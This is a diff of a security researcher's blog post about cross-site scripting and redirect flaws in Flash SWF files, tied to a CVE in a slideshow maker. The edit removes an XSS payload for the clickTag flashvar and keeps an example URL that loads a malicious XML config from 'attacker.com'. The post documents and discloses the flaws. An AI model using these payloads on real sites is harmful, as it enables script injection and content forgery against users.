@@ -77,15 +77,11 @@ button 48 {
 	}
    }</i>
 </pre>
-The above illustrates a vulnerability pertinent to the clickTag flashvar. During an analysis, it was discovered that this 'clickTag' variable is associated with the release of button 48, note the use of the global var, _level0. This button was mapped to the entire flash movie. Meaning, that the value stored within this flashvar is called strictly upon the condition of the victim clicking anywhere on the movie itself. Therefore, in this case, the vulnerability does require a form of social interaction for its successful exploitation, as the user is required to click on the flash movie to trigger the exploit.
+<p>The above illustrates a vulnerability pertinent to the clickTag flashvar. An analysis on the above can be observed <a href="posts/ASD-XSSposed.html">here</a>.<p>
+<p>Vulnerabilities that could exist within Shockwave Flash files include; SOME attacks, Content Forgery, Unvalidated Redirects, as well as, XSS.</p>
 
-In the case of the above scenario, the clickTag flashvar was initially declared to serve a purpose of re-directing a user to an informative page segment within the HTTP content. However, due to the lack of variable definition, as well as, lack of input sanitization, use of the unsafe GetURL() method, and incorporation of the insecure _level0 global variable; An attacker is able to control the behaviour of the vulnerable variable in question. This is achieved by assigning malicious values to that var and have it called via GET. Such vulnerabilities that could exist within Shockwave Flash files includes; SOME attacks, Content Forgery, Unvalidated Redirects, as well as, XSS, thus allowing an attacker to execute malicious client-side scripts.
-
-The above example can be exploited via:
-<pre class="hack dark">
-?clickTag=javascript:confirm(document.domain); or ?clickTag=//ret2eax.pw
-</pre>
-In terms of exploiting such vulnerabilities through a cross-domain approach, some vendors incorporate an XML config file to control the behaviour of the SWF. Therefore, these SWF files may have a dynamic flashvar pointing to a config file on the same server the SWF is hosted on. However, if this flashvar can be controlled by the attacker externally, with a correct cross-domain policy configured on the attacking server, all that is required is to remotely call a malicious XML variation (hosted on an attacker’s server), which in turn, will include the instructions to control the SWF, thus determining its behaviour. The attack vectors associated with this method of exploitation remains similar as to that of the above, however, the methods slightly vary. For example, an XSS payload is incorporated within an XML entity either as a variable’s value, or included in an arbitrary sense through the malicious XML via the use of CDATA:
+<p>In terms of exploiting such vulnerabilities through a cross-domain approach, some vendors incorporate an XML config file to control the behaviour of the SWF. Therefore, these SWF files may have a dynamic flashvar pointing to a config file on the same server the SWF is hosted on. However, if this flashvar can be controlled by the attacker externally, with a correct cross-domain policy configured on the attacking server, all that is required is to remotely call a malicious XML variation (hosted on an attacker’s server), which in turn, will include the instructions to control the SWF, thus determining its behaviour. The attack vectors associated with this method of exploitation remains similar as to that of the above, however, the methods slightly vary. For example, an XSS payload is incorporated within an XML entity either as a variable’s value, or arbitrarily through the malicious XML via the use of CDATA:
+</p>
 
 <p>#[EXPLOITING VULNERABLE XML CONFIGURATIONS THROUGH CDATA] :</p>
 <pre class="hack dark">
@@ -95,8 +91,8 @@ In terms of exploiting such vulnerabilities through a cross-domain approach, som
 This would then be called in the manner of:
 	http://example.com/swf/example.swf?xml_path=//attacker.com/poc.xml
 
-I identified this issue within many SWF generators and slideshow makers, including that of a Windows application titled Flash Slideshow Maker Professional, with version 5.20 and below being vulnerable in the way they handle 'advanced' file behaviour. See <a href="cve-2017-12439.html">CVE-2017-12439</a> for more information.
-<p> ~ ret2eax
+I identified this issue within many SWF generators and slideshow makers, including that of a Windows application titled <a href="https://www.flash-slideshow-maker.com/">Flash Slideshow Maker Professional</a>, with version 5.20 and below being vulnerable in the way they handle 'advanced' file behaviour. See <a href="cve-2017-12439.html">CVE-2017-12439</a> for more information.
+<p> ~ ret2eax</p>
 </div>
 <center>
 <footer><< <a href="http://twitter.com/ret2eax" target="_blank"">twitter</a> || <a href="https://www.openbugbounty.org/researchers/ret2eax/" target="_blank">openbugbounty</a> || <a href="https://www.hackerone.com/ret2eax" target="_blank">h1</a> || <a href="mailto:ret2eax@riseup.net">ret2eax@riseup.net</a> >></footer></center>
